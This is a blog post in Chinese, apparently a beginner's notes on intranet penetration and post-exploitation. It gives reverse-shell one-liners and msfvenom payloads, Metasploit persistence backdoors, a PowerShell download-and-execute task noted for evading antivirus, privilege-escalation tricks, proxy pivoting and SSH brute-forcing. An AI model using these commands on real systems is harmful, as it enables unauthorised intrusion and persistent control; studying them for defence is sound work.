@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="前言上个学期一直在学关于审计方面的知识，前几天ST2漏洞大火，随便打一个就是root权限，我却拿着root权限不知如何继续进行。因为这个，发现了自己对渗透知识的缺失，因此用了两周左右的时间学习补充了一下内网渗透的知识，看了不少大牛的文章，膜拜之余还是做了一些笔记的。到渗透入门结束之余，打算自己整理一下最近学习到的知识，写一篇文章。 渗透初探一个概念： 正向shell：攻击者连接被攻击者机器，可用于">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0基础内网渗透思路整理与工具使用">
+<meta property="og:url" content="http://hebic.me/2017/08/19/0基础内网渗透思路整理与工具使用/index.html">
+<meta property="og:site_name" content="Homaebic-Know thyself">
+<meta property="og:description" content="前言上个学期一直在学关于审计方面的知识，前几天ST2漏洞大火，随便打一个就是root权限，我却拿着root权限不知如何继续进行。因为这个，发现了自己对渗透知识的缺失，因此用了两周左右的时间学习补充了一下内网渗透的知识，看了不少大牛的文章，膜拜之余还是做了一些笔记的。到渗透入门结束之余，打算自己整理一下最近学习到的知识，写一篇文章。 渗透初探一个概念： 正向shell：攻击者连接被攻击者机器，可用于">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://120.25.80.195:7230/03/789141832.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/3209463369.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/1654433721.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/3297350245.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/130628689.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/1396957995.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/1849068889.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/1675412074.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/2535078459.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/4169629812.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/3281981286.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/2122538903.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/2126598664.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/1073963976.jpg">
+<meta property="og:image" content="http://120.25.80.195:7230/03/328449163.png">
+<meta property="og:image" content="http://120.25.80.195:7230/03/2760296121.png">
+<meta property="og:image" content="http://120.25.80.195:7230/03/2866053101.png">
+<meta property="og:image" content="http://120.25.80.195:7230/03/92956616.png">
+<meta property="og:image" content="http://120.25.80.195:7230/03/2138848702.png">
+<meta property="og:image" content="http://120.25.80.195:7230/03/711361399.png">
+<meta property="og:updated_time" content="2017-08-20T00:55:05.861Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="0基础内网渗透思路整理与工具使用">
+<meta name="twitter:description" content="前言上个学期一直在学关于审计方面的知识，前几天ST2漏洞大火，随便打一个就是root权限，我却拿着root权限不知如何继续进行。因为这个，发现了自己对渗透知识的缺失，因此用了两周左右的时间学习补充了一下内网渗透的知识，看了不少大牛的文章，膜拜之余还是做了一些笔记的。到渗透入门结束之余，打算自己整理一下最近学习到的知识，写一篇文章。 渗透初探一个概念： 正向shell：攻击者连接被攻击者机器，可用于">
+<meta name="twitter:image" content="http://120.25.80.195:7230/03/789141832.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>0基础内网渗透思路整理与工具使用</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/friends/">Friendly link</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2017/08/19/MySQL注入绕过过滤表名/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
+        
+        
+        <li><a class="icon" href="/2017/08/19/审计入门之路（四）：GeniXCMS/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://hebic.me/2017/08/19/0基础内网渗透思路整理与工具使用/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://hebic.me/2017/08/19/0基础内网渗透思路整理与工具使用/&text=0基础内网渗透思路整理与工具使用"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://hebic.me/2017/08/19/0基础内网渗透思路整理与工具使用/&title=0基础内网渗透思路整理与工具使用"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://hebic.me/2017/08/19/0基础内网渗透思路整理与工具使用/&is_video=false&description=0基础内网渗透思路整理与工具使用"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=0基础内网渗透思路整理与工具使用&body=Check out this article: http://hebic.me/2017/08/19/0基础内网渗透思路整理与工具使用/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://hebic.me/2017/08/19/0基础内网渗透思路整理与工具使用/&title=0基础内网渗透思路整理与工具使用"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://hebic.me/2017/08/19/0基础内网渗透思路整理与工具使用/&title=0基础内网渗透思路整理与工具使用"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://hebic.me/2017/08/19/0基础内网渗透思路整理与工具使用/&title=0基础内网渗透思路整理与工具使用"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://hebic.me/2017/08/19/0基础内网渗透思路整理与工具使用/&title=0基础内网渗透思路整理与工具使用"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://hebic.me/2017/08/19/0基础内网渗透思路整理与工具使用/&name=0基础内网渗透思路整理与工具使用&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#渗透初探"><span class="toc-number">2.</span> <span class="toc-text">渗透初探</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一个概念："><span class="toc-number">2.0.1.</span> <span class="toc-text">一个概念：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf-shell"><span class="toc-number">2.1.</span> <span class="toc-text">msf shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#反向shell"><span class="toc-number">2.1.0.1.</span> <span class="toc-text">反向shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#正向shell"><span class="toc-number">2.1.0.2.</span> <span class="toc-text">正向shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他的各种各样的姿势的反弹shell："><span class="toc-number">2.1.1.</span> <span class="toc-text">其他的各种各样的姿势的反弹shell：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用SSH通道："><span class="toc-number">2.1.2.</span> <span class="toc-text">使用SSH通道：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#拿到shell后的两个方向"><span class="toc-number">2.2.</span> <span class="toc-text">拿到shell后的两个方向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#如果是低权限的机器，就提权："><span class="toc-number">2.2.1.</span> <span class="toc-text">如果是低权限的机器，就提权：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一些其他的办法："><span class="toc-number">2.2.2.</span> <span class="toc-text">一些其他的办法：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后门"><span class="toc-number">2.3.</span> <span class="toc-text">后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Msf的持续后门："><span class="toc-number">2.3.1.</span> <span class="toc-text">Msf的持续后门：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Msf自动运行脚本"><span class="toc-number">2.3.2.</span> <span class="toc-text">Msf自动运行脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用persistence和autorunscript留后门的方法是："><span class="toc-number">2.3.3.</span> <span class="toc-text">使用persistence和autorunscript留后门的方法是：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过拦截的计划任务："><span class="toc-number">2.3.4.</span> <span class="toc-text">绕过拦截的计划任务：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#网络分析"><span class="toc-number">3.</span> <span class="toc-text">网络分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#查看本机网络信息"><span class="toc-number">3.1.</span> <span class="toc-text">查看本机网络信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#使用代理探测内网"><span class="toc-number">3.2.</span> <span class="toc-text">使用代理探测内网</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#正向代理：Regeorg-proxychains-（win下用proxycap）"><span class="toc-number">3.2.1.</span> <span class="toc-text">正向代理：Regeorg + proxychains （win下用proxycap）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反向代理：路由表-socks4a-proxychains"><span class="toc-number">3.2.2.</span> <span class="toc-text">反向代理：路由表+socks4a+proxychains</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Proxychains-不支持ICMP协议，nmap要加-sT-和-Pn-参数。"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">Proxychains 不支持ICMP协议，nmap要加-sT 和 -Pn 参数。</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用nmap探测内网服务"><span class="toc-number">3.2.3.</span> <span class="toc-text">使用nmap探测内网服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通过跳板对内网爆破"><span class="toc-number">3.2.4.</span> <span class="toc-text">通过跳板对内网爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通过跳板转发端口"><span class="toc-number">3.2.5.</span> <span class="toc-text">通过跳板转发端口</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#关注的两个点："><span class="toc-number">3.2.5.1.</span> <span class="toc-text">关注的两个点：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#分析网络"><span class="toc-number">4.</span> <span class="toc-text">分析网络</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#参考文章："><span class="toc-number">4.0.0.1.</span> <span class="toc-text">参考文章：</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        0基础内网渗透思路整理与工具使用
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Homaebic-Know thyself</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2017-08-19T09:15:04.000Z" itemprop="datePublished">2017-08-19</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上个学期一直在学关于审计方面的知识，前几天ST2漏洞大火，随便打一个就是root权限，我却拿着root权限不知如何继续进行。因为这个，发现了自己对渗透知识的缺失，因此用了两周左右的时间学习补充了一下内网渗透的知识，看了不少大牛的文章，膜拜之余还是做了一些笔记的。到渗透入门结束之余，打算自己整理一下最近学习到的知识，写一篇文章。</p>
+<h1 id="渗透初探"><a href="#渗透初探" class="headerlink" title="渗透初探"></a>渗透初探</h1><h3 id="一个概念："><a href="#一个概念：" class="headerlink" title="一个概念："></a>一个概念：</h3><ol>
+<li>正向shell：攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于公网的情况。<pre><code>攻击者--&gt;被攻击者
+</code></pre></li>
+<li>反向shell：被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况。<pre><code>攻击者&lt;--被攻击者
+</code></pre></li>
+</ol>
+<h2 id="msf-shell"><a href="#msf-shell" class="headerlink" title="msf shell"></a>msf shell</h2><h4 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h4><h4 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h4><ol>
+<li>Linux:<code>msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.102 lport=4444  -f elf -o isshell</code><br><img src="http://120.25.80.195:7230/03/789141832.jpg" alt="linux_shell.jpg"></li>
+<li>Windows:<code>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\\x00’ LHOST=121.196.209.139 LPORT=4444 -f exe &gt; abc.exe</code><br><img src="http://120.25.80.195:7230/03/3209463369.jpg" alt="windows_shell.jpg"></li>
+<li>Android:<code>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=5555 R &gt; /root/apk.apk</code><br><img src="http://120.25.80.195:7230/03/1654433721.jpg" alt="andioid_shell.jpg"></li>
+</ol>
+<h3 id="其他的各种各样的姿势的反弹shell："><a href="#其他的各种各样的姿势的反弹shell：" class="headerlink" title="其他的各种各样的姿势的反弹shell："></a>其他的各种各样的姿势的反弹shell：</h3><ol>
+<li>bash:<code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></li>
+<li>perl: <code>perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</code></li>
+<li>python: <code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></li>
+</ol>
+<h3 id="使用SSH通道："><a href="#使用SSH通道：" class="headerlink" title="使用SSH通道："></a>使用SSH通道：</h3><p><code>Ssh -qTfnN -L port:host:hostport -l user remote_ip</code> 正向隧道，监听本地port<br><code>Ssh -qTfnN -R port:host:hostport -l user remote_ip</code> 反向隧道，用于内网穿透防火墙限制之类<br><code>Ssh -qTfnN -D port remotehost</code> 直接进行socks代理<br>参数：<br>-q 安静模式<br>-T 不占用shell<br>-f 后台运行，推荐加-n参数<br>-N 不执行远程命令</p>
+<p>SSH端口转发：<br><code>Ssh -CfNg -L port1:127.0.0.1:port2 user@host</code> 本地转发<br><code>Ssh -CfNg -R port2:127.0.0.1:port1 user@hsst</code> 远程转发</p>
+<hr>
+<h2 id="拿到shell后的两个方向"><a href="#拿到shell后的两个方向" class="headerlink" title="拿到shell后的两个方向"></a>拿到shell后的两个方向</h2><h3 id="如果是低权限的机器，就提权："><a href="#如果是低权限的机器，就提权：" class="headerlink" title="如果是低权限的机器，就提权："></a>如果是低权限的机器，就提权：</h3><ol>
+<li>检查操作系统发行版本：<code>lsb_release -a</code><br><img src="http://120.25.80.195:7230/03/3297350245.jpg" alt="lsb.jpg"></li>
+<li>查看内核版本：<code>uname -a</code><br><img src="http://120.25.80.195:7230/03/130628689.jpg" alt="uname.jpg"> </li>
+</ol>
+<p>依据系统的内核，寻找对应的exp提权：<br>根据内核寻找exp的网站： <a><a href="https://www.kernel-exploits.com/" target="_blank" rel="external">https://www.kernel-exploits.com/</a></a> ，也可以用kali下的<code>searchsploit</code>命令<br><img src="http://120.25.80.195:7230/03/1396957995.jpg" alt="search.jpg"><br>如果尝试的所有的exp都失败了，可以试一试新版本内核的exp。但是注意，内核exp提权有崩溃系统的风险。</p>
+<h3 id="一些其他的办法："><a href="#一些其他的办法：" class="headerlink" title="一些其他的办法："></a>一些其他的办法：</h3><ol>
+<li>利用SUID提权<br>SUID是一种属性，他允许用户执行的文件以该文件的拥有者身份运行。3.81的nmap中可以使用交互模式以root执行任意系统命令。</li>
+<li>环境变量劫持的方法提权</li>
+<li>Passwd文件是否可写，可写则修改密码登录<br><img src="http://120.25.80.195:7230/03/1849068889.jpg" alt="passwd.jpg"></li>
+<li>Shadow是否可读，可读则使用hashcat或john暴力破解<br><img src="http://120.25.80.195:7230/03/1675412074.jpg" alt="shadow.jpg"></li>
+<li>使用web端的一些密码测试root密码是否相同</li>
+<li>使用命令 <code>ls -l /etc/cron*</code> 查看计划任务，也许会有脚本使自己成为root用户<br><img src="http://120.25.80.195:7230/03/2535078459.jpg" alt="cron.jpg"></li>
+<li>使用命令 <code>netstat -antup</code>查看服务，有没有什么神奇的服务，可以用nc转发出来。<br><img src="http://120.25.80.195:7230/03/4169629812.jpg" alt="antup.jpg"></li>
+<li>相关工具：<a><a href="https://www.securitysift.com/download/linuxprivchecker.py" target="_blank" rel="external">https://www.securitysift.com/download/linuxprivchecker.py</a></a> 详细地列出网卡信息，主机信息，passwd文件，开启服务等等信息。</li>
+</ol>
+<p>提权的方法复杂而多样，主要的手段还是第一种的使用exp提权。在尝试所有的提权方法之后依然不能成功，那么可以使用这台主机作为跳板进行内网的进一步渗透。</p>
+<h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><h3 id="Msf的持续后门："><a href="#Msf的持续后门：" class="headerlink" title="Msf的持续后门："></a>Msf的持续后门：</h3><ol>
+<li><code>Persistence: run persistence -h</code>：用于创建启动项启动，会创建注册表，创建文件。（X86_Linux不支持此脚本）</li>
+<li><code>Run metsvc -h</code> ：用于创建服务，会创建meterpreter服务，并上传三个文件，容易被杀（我的msf版本不支持）使用-r参数可以卸载服务</li>
+<li><code>Mof_ps_persist</code><h3 id="Msf自动运行脚本"><a href="#Msf自动运行脚本" class="headerlink" title="Msf自动运行脚本"></a>Msf自动运行脚本</h3>Autorunscript，一个十分强大的脚本，可以在生成会话的同事，执行指定的操作。可以通过autorunscript调用的脚本有6个，目录<code>metasploit/scripts/meterpreter</code>，有屏幕截图，获取环境变量等等。<h3 id="使用persistence和autorunscript留后门的方法是："><a href="#使用persistence和autorunscript留后门的方法是：" class="headerlink" title="使用persistence和autorunscript留后门的方法是："></a>使用persistence和autorunscript留后门的方法是：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Use explit/multi/handler</div><div class="line">Set payload windows/meterpreter/reverse_tcp</div><div class="line">Set lhost ***</div><div class="line">Set lport ***</div><div class="line">Set ExitOnSession false</div><div class="line">Set AutoRunScript persistence -r *** -p 7231 -U -X -I 30</div><div class="line">Exploit -j -z</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="绕过拦截的计划任务："><a href="#绕过拦截的计划任务：" class="headerlink" title="绕过拦截的计划任务："></a>绕过拦截的计划任务：</h3><ol>
+<li>构造创建计划任务：<code>schtasks /create /tn mytask /tr notepad.exe /sc hourly  /mo 1 #每小时执行一次</code><br><img src="http://120.25.80.195:7230/03/3281981286.jpg" alt="计划任务.jpg"></li>
+<li><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://a.com/1.ps1&#39;);&quot;</code> 保存以上命令到1.ps一，通过IEX下载执行。<br><img src="http://120.25.80.195:7230/03/2122538903.jpg" alt="计划报毒.jpg"> </li>
+</ol>
+<p><img src="http://120.25.80.195:7230/03/2126598664.jpg" alt="powershell 计划之情.jpg"></p>
+<ol>
+<li>本机测试时360第二种报毒，第一种通过。</li>
+</ol>
+<hr>
+<h1 id="网络分析"><a href="#网络分析" class="headerlink" title="网络分析"></a>网络分析</h1><h2 id="查看本机网络信息"><a href="#查看本机网络信息" class="headerlink" title="查看本机网络信息"></a>查看本机网络信息</h2><p><code>ipconfig</code></p>
+<h2 id="使用代理探测内网"><a href="#使用代理探测内网" class="headerlink" title="使用代理探测内网"></a>使用代理探测内网</h2><h3 id="正向代理：Regeorg-proxychains-（win下用proxycap）"><a href="#正向代理：Regeorg-proxychains-（win下用proxycap）" class="headerlink" title="正向代理：Regeorg + proxychains （win下用proxycap）"></a>正向代理：Regeorg + proxychains （win下用proxycap）</h3><ol>
+<li>Regeorg: <a href="https://github.com/sensepost/reGeorg" target="_blank" rel="external">https://github.com/sensepost/reGeorg</a><br><img src="http://120.25.80.195:7230/03/1073963976.jpg" alt="regeorg.jpg"><br>上传服务器可执行的tunnel文件，在本机执行：<code>python reGeorgSocksProxy.py -p 2333 -u http://aaaaaa.com/tunnel.php</code></li>
+<li>Proxychains: <a><a href="https://github.com/rofl0r/proxychains-ng" target="_blank" rel="external">https://github.com/rofl0r/proxychains-ng</a></a><br><img src="http://120.25.80.195:7230/03/328449163.png" alt="proxychains.png"><br>配置文件 <code>vim /etc/proxychains.conf</code><br>在最后一行添加<code>socks5 127.0.0.1 2333</code>(与regeorg端口相同)<br>使用时，在执行的命令前加proxhchains 4, 比如：<code>proxychains4 nmap -sT -Pn -n 127.0.0.1</code><h3 id="反向代理：路由表-socks4a-proxychains"><a href="#反向代理：路由表-socks4a-proxychains" class="headerlink" title="反向代理：路由表+socks4a+proxychains"></a>反向代理：路由表+socks4a+proxychains</h3>在msf中如果拿到一个meterpreter shell，有一个很简单的添加路由表的方法：<code>run autoroute -s 192.168.122.0/24</code>，添加完路由表后，msf框架就可以使用跳板进行对192.168.122.0/24的网络访问了。<br>若要使用nmap一类的工具，需要使用msf框架中的socks4a工具代理，目录：<code>auxiliary/server/socks4a</code><br><img src="http://120.25.80.195:7230/03/2760296121.png" alt="socks4a.png"></li>
+</ol>
+<p>开启socks4a后可以用<code>netstat -antp | grep 1080</code>来检查一下是否成功。<br><img src="http://120.25.80.195:7230/03/2866053101.png" alt="nmap.png"></p>
+<h4 id="Proxychains-不支持ICMP协议，nmap要加-sT-和-Pn-参数。"><a href="#Proxychains-不支持ICMP协议，nmap要加-sT-和-Pn-参数。" class="headerlink" title="Proxychains 不支持ICMP协议，nmap要加-sT 和 -Pn 参数。"></a>Proxychains 不支持ICMP协议，nmap要加-sT 和 -Pn 参数。</h4><h3 id="使用nmap探测内网服务"><a href="#使用nmap探测内网服务" class="headerlink" title="使用nmap探测内网服务"></a>使用nmap探测内网服务</h3><ol>
+<li>如果只探测服务，则查看hosts，扫描特定的服务。</li>
+<li>如果为了探测整个内网，则全网段扫描。</li>
+</ol>
+<h3 id="通过跳板对内网爆破"><a href="#通过跳板对内网爆破" class="headerlink" title="通过跳板对内网爆破"></a>通过跳板对内网爆破</h3><p>kali工具包中的Hydra可以爆破SSH。<br><img src="http://120.25.80.195:7230/03/92956616.png" alt="SSHbaopo.png"></p>
+<h3 id="通过跳板转发端口"><a href="#通过跳板转发端口" class="headerlink" title="通过跳板转发端口"></a>通过跳板转发端口</h3><p>使用msf的portfwd工具可以转发内网ip的端口。<br><img src="http://120.25.80.195:7230/03/2138848702.png" alt="portfwd.png"></p>
+<p><img src="http://120.25.80.195:7230/03/711361399.png" alt="portfwd2.png"></p>
+<h4 id="关注的两个点："><a href="#关注的两个点：" class="headerlink" title="关注的两个点："></a>关注的两个点：</h4><ol>
+<li>寻找交换机路由器，尝试snmp弱口令。关于snmp的知识：<a><a href="http://wooyun.jozxing.cc/static/drops/tips-409.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/tips-409.html</a></a></li>
+<li>通过收集到的信息，编写字典，对ftp,ssh,dbserver进行爆破。</li>
+<li>对内网的web服务进行攻击，内网的web弱口令更普遍。</li>
+</ol>
+<p>为扩大控制范围，优先控制交换机路由器等网络设备。</p>
+<hr>
+<h1 id="分析网络"><a href="#分析网络" class="headerlink" title="分析网络"></a>分析网络</h1><p>假设控制路由器，通过路由器收集以下信息：</p>
+<ol>
+<li>设备配置</li>
+<li>查看相关权限与exp提权</li>
+<li>查看版本信息</li>
+<li>查看ip地址</li>
+<li>活动主机</li>
+<li>构建拓扑图</li>
+</ol>
+<p>之后可以通过流量监控获取更多数据，进行深入的渗透。后面的内容我就没有学习了，笔记戛然而止！</p>
+<h4 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h4><ol>
+<li><a href="https://www.waitalone.cn/linux-shell-rebound-under-way.html" target="_blank" rel="external">https://www.waitalone.cn/linux-shell-rebound-under-way.html</a></li>
+<li><a href="http://www.tuicool.com/articles/j2eayaF" target="_blank" rel="external">http://www.tuicool.com/articles/j2eayaF</a></li>
+<li><a href="http://wooyun.jozxing.cc/static/drops/tips-16116.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/tips-16116.html</a></li>
+<li><a href="https://www.secpulse.com/archives/51092.html" target="_blank" rel="external">https://www.secpulse.com/archives/51092.html</a></li>
+<li><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-097180.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/bugs/wooyun-2015-097180.html</a></li>
+</ol>
+<p>本文首发于<a href="http://bobao.360.cn/learning/detail/3683.html（原创），安全客要求自己博客需要注明，就写在这里啦。" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3683.html（原创），安全客要求自己博客需要注明，就写在这里啦。</a></p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/friends/">Friendly link</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#渗透初探"><span class="toc-number">2.</span> <span class="toc-text">渗透初探</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一个概念："><span class="toc-number">2.0.1.</span> <span class="toc-text">一个概念：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf-shell"><span class="toc-number">2.1.</span> <span class="toc-text">msf shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#反向shell"><span class="toc-number">2.1.0.1.</span> <span class="toc-text">反向shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#正向shell"><span class="toc-number">2.1.0.2.</span> <span class="toc-text">正向shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他的各种各样的姿势的反弹shell："><span class="toc-number">2.1.1.</span> <span class="toc-text">其他的各种各样的姿势的反弹shell：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用SSH通道："><span class="toc-number">2.1.2.</span> <span class="toc-text">使用SSH通道：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#拿到shell后的两个方向"><span class="toc-number">2.2.</span> <span 